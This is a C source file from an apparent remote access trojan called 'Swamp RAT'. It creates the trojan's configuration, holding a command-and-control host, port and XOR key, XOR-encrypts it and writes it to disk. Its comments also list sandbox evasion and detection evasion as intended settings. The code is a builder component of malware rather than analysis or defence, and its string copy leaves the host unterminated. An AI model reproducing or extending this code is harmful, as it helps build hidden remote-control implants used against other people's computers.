// Swamp RAT Configuration Writer
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include "../defs.h"
#include "crypt.h"

config *config_create(char * host,
                      int host_port,
                      int xor_key){
  /*
    :TODO: write config to memory pointer
    :host_port: host port
    :host: host domain name or ip address
    :sandbox_evasion: sandbox evasion
    :detection_evasion: detection evasion
    :returns: pointer to configuration data
  */
  config *p_config = malloc(sizeof(config));
  p_config->host_port = host_port;
  if (strlen(host) > MAX_DOMAIN_LEN){
    fprintf(stderr, "error: config host exceeds max domain length\n");
    exit(EXIT_FAILURE);
  } else{
    strncpy(p_config->host, host, strlen(host));
  }
  p_config->xor_key = xor_key;
  return p_config;
}

bool config_write(char *config_path,
                  char *host,
                  int host_port,
                  int xor_key){
  /*
    :TODO: write configuration to file
    :host_port: host port
    :host: domain name or ip address
    :sandbox_evasion: sandbox evasion
    :detection_evasion: detection evasion
    :returns: bool
  */
  config *p_config_host = config_create(host,
                                        host_port,
                                        xor_key);
  crypt_encrypt_xor_config(p_config_host, sizeof(config), xor_key);
  FILE *fp;
  fp = fopen(config_path, "w");
  fwrite(p_config_host,
         sizeof(config),
         1,
         fp);
  fclose(fp);
  free(p_config_host);
  return true;
}
